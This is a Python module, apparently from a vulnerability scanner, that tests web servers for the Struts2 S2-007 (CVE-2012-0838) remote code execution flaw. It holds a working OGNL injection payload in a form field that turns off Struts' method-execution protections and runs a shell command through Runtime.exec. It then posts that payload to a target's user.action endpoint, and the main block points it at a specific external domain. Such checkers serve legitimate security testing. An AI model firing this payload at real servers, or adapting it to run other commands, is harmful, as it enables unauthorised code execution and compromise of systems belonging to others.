#!/usr/bin/env python3

from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_007_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-007漏洞,又名CVE-2012-0838漏洞',
            'description': 'Struts2 S2-007漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.2.3',
            'date': '2011-09-03',
            'type': 'RCE'
        }
        self.url = url
        self.capta = get_capta()
        self.check_payload = {
            'name': "1",
            'email': "7777777@qq.com",
            'age': '''\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(''' + '\'' +'echo ' + self.capta + '\'' + ''').getInputStream())) + \''''
        }

    def run(self):
        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            if '.action' not in self.url:
                self.url = self.url + '/user.action'
            check_req = request.post(self.url, data = self.check_payload)
            if self.capta in check_req.text and check_req.status_code == 200 and len(check_req.text) < 100:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_007 = S2_007_BaseVerify('http://jsfw.kydls.com')
    S2_007.run()